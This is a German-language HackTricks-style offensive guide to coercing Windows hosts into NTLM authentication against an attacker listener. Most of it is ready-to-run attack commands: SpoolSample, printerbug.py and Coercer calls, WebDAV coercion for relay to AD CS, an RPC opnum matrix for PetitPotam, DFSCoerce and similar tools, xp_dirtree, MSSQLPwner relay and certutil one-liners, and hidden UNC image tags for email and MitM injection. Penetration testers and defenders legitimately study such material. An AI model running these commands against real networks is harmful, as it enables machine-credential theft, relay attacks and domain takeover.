# Erzwingen privilegierter NTLM-Authentifizierung

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ist eine **Sammlung** von **remote authentication triggers**, die in C# mithilfe des MIDL-Compilers programmiert wurden, um Abhängigkeiten von Drittanbietern zu vermeiden.

## Missbrauch des Spooler Service

Wenn der _**Print Spooler**_-Service **aktiviert** ist, kannst du bereits bekannte AD-Anmeldedaten verwenden, um beim Printserver des Domain Controllers ein **Update** zu neuen Druckaufträgen **anzufordern** und ihn einfach anweisen, die Benachrichtigung an ein bestimmtes System zu **senden**.\
Beachte: Wenn der Drucker die Benachrichtigung an beliebige Systeme sendet, muss er sich **gegenüber** diesem **System authentifizieren**. Daher kann ein Angreifer den _**Print Spooler**_-Service dazu bringen, sich gegenüber einem beliebigen System zu authentifizieren, wobei der Service bei dieser Authentifizierung das **Computerkonto** verwendet.

Unter der Haube missbraucht das klassische **PrinterBug**-Primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** über **`\\PIPE\\spoolss`**. Der Angreifer öffnet zunächst ein Printer-/Server-Handle und übergibt anschließend einen gefälschten Clientnamen in `pszLocalMachine`, sodass der Ziel-Spooler einen Benachrichtigungskanal **zurück zum vom Angreifer kontrollierten Host** erstellt. Deshalb handelt es sich um **outbound authentication coercion** und nicht um direkte Codeausführung.<sup>[[2]](#references)</sup>\
Wenn du nach **RCE/LPE** im Spooler selbst suchst, sieh dir [PrintNightmare](printnightmare.md) an. Diese Seite konzentriert sich auf **coercion und relay**.

### Windows-Server in der Domäne finden

Rufe mit PowerShell eine Liste der Windows-Systeme ab. Server haben normalerweise Priorität, konzentrieren wir uns also darauf:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Nach Spooler-Diensten suchen, die lauschen

Verwende eine leicht modifizierte Version von @mysmartlogin's (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), um zu prüfen, ob der Spooler Service lauscht:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Du kannst unter Linux auch `rpcdump.py` verwenden und nach dem **MS-RPRN**-Protokoll suchen:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Oder teste Hosts schnell von Linux aus mit **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Wenn du **Coercion-Oberflächen** erfassen möchtest, anstatt nur zu prüfen, ob der Spooler-Endpoint existiert, verwende den **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Dies ist nützlich, weil das Anzeigen des Endpunkts in EPM lediglich bestätigt, dass die Print-RPC-Schnittstelle registriert ist. Es **garantiert nicht**, dass jede Coercion-Methode mit Ihren aktuellen Berechtigungen erreichbar ist oder dass der Host einen nutzbaren Authentifizierungsablauf auslöst.

### Den Dienst auffordern, sich bei einem beliebigen Host zu authentifizieren

Sie können [SpoolSample von hier](https://github.com/NotMedic/NetNTLMtoSilverTicket) kompilieren.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oder verwende [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) oder [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), wenn du unter Linux arbeitest
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Mit **Coercer** kannst du die Spooler-Schnittstellen direkt ansprechen und vermeiden, raten zu müssen, welche RPC-Methode verfügbar ist:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### HTTP statt SMB mit WebClient erzwingen

Der klassische PrinterBug führt üblicherweise zu einer **SMB**-Authentifizierung bei `\\attacker\share`, was weiterhin für **capture**, **relay to HTTP targets** oder **relay where SMB signing is absent** nützlich ist.\
In modernen Umgebungen wird **SMB to SMB**-Relaying jedoch häufig durch **SMB signing** blockiert. Daher bevorzugen Operatoren oft, stattdessen eine **HTTP/WebDAV**-Authentifizierung zu erzwingen.

Wenn auf dem Ziel der **WebClient**-Dienst läuft, kann der Listener in einer Form angegeben werden, durch die Windows **WebDAV over HTTP** verwendet:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Dies ist besonders nützlich, wenn dies mit **`ntlmrelayx --adcs`** oder anderen HTTP relay targets verkettet wird, da dadurch vermieden wird, sich auf die SMB relayability der erzwungenen Verbindung zu verlassen. Der wichtige Vorbehalt ist, dass **WebClient auf dem Opfer ausgeführt werden muss**, damit die HTTP/WebDAV-Variante funktioniert.

### Kombination mit Unconstrained Delegation

Wenn ein Angreifer bereits einen Computer mit [Unconstrained Delegation](unconstrained-delegation.md) kompromittiert hat, könnte der Angreifer **den Drucker dazu bringen, sich bei diesem Computer zu authentifizieren**. Aufgrund der Unconstrained Delegation wird das **TGT** des **Computerkontos des Druckers** im **Speicher** des Computers mit Unconstrained Delegation **gespeichert**. Da der Angreifer diesen Host bereits kompromittiert hat, kann er **dieses Ticket abrufen** und missbrauchen ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Hinweis: Diese Methoden akzeptieren Parameter, die einen UNC-Pfad enthalten können (z. B. `\\attacker\share`). Bei der Verarbeitung authentifiziert sich Windows (im Kontext eines Computers/eines Benutzers) bei diesem UNC-Pfad, wodurch das Erfassen oder Relayen von NetNTLM ermöglicht wird.\
Beim Spooler abuse bleibt **MS-RPRN opnum 65** das am häufigsten verwendete und am besten dokumentierte primitive Verfahren, da die Protokollspezifikation ausdrücklich festlegt, dass der Server einen Notification-Kanal zurück zum durch `pszLocalMachine` angegebenen Client erstellt.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN über \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: Das Ziel versucht, den angegebenen Pfad zum Backup-Log zu öffnen, und authentifiziert sich beim vom Angreifer kontrollierten UNC-Pfad.<sup>[[1]](#references)</sup>
- Practical use: Tier-0-Assets (DC/RODC/Citrix/usw.) dazu bringen, NetNTLM auszugeben, und dieses anschließend an AD CS endpoints (ESC8/ESC11 scenarios) oder andere privilegierte Dienste relayen.<sup>[[1]](#references)</sup>

## PrivExchange

Der `PrivExchange`-Angriff ist das Ergebnis eines Fehlers in der **`PushSubscription`-Funktion des Exchange Server**. Diese Funktion ermöglicht es, den Exchange-Server durch jeden Domänenbenutzer mit einem Mailbox dazu zu zwingen, sich über HTTP bei einem vom Client bereitgestellten Host zu authentifizieren.

Standardmäßig wird der **Exchange-Dienst als SYSTEM ausgeführt** und verfügt über übermäßige Berechtigungen (insbesondere **WriteDacl-Berechtigungen für die Domäne vor dem Cumulative Update 2019**). Dieser Fehler kann ausgenutzt werden, um das **Relaying von Informationen an LDAP und anschließend das Extrahieren der NTDS-Datenbank der Domäne** zu ermöglichen. Wenn ein Relay an LDAP nicht möglich ist, kann dieser Fehler weiterhin verwendet werden, um Relay- und Authentifizierungsvorgänge bei anderen Hosts innerhalb der Domäne durchzuführen. Die erfolgreiche Ausnutzung dieses Angriffs gewährt mit jedem authentifizierten Domänenbenutzerkonto sofortigen Zugriff auf den Domain Admin.

## Innerhalb von Windows

Wenn Sie sich bereits innerhalb des Windows-Computers befinden, können Sie Windows dazu zwingen, sich mit privilegierten Konten mit einem Server zu verbinden, durch:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oder verwenden Sie diese andere Technik: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es ist möglich, das LOLBin certutil.exe (von Microsoft signierte Binärdatei) zu verwenden, um eine NTLM-Authentifizierung zu erzwingen:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via E-Mail

Wenn du die **E-Mail-Adresse** des Benutzers kennst, der sich an einer Maschine anmeldet, die du kompromittieren möchtest, könntest du ihm einfach eine **E-Mail mit einem 1x1-Bild** senden, wie etwa
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
und wenn er sie öffnet, wird er versuchen, sich zu authentifizieren.

### MitM

Wenn du einen MitM-Angriff auf einen Computer durchführen und HTML in eine von ihm angezeigte Seite einschleusen kannst, könntest du versuchen, ein Bild wie das folgende in die Seite einzuschleusen:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Andere Möglichkeiten, NTLM-Authentifizierung zu erzwingen und zu phishen


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 cracken

Wenn du [NTLMv1-Challenges erfassen kannst, lies hier, wie du sie cracken kannst](../ntlm/index.html#ntlmv1-attack).\
_Denke daran, dass du zum Cracken von NTLMv1 die Responder-Challenge auf "1122334455667788" setzen musst._

## Referenzen

- [1] [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
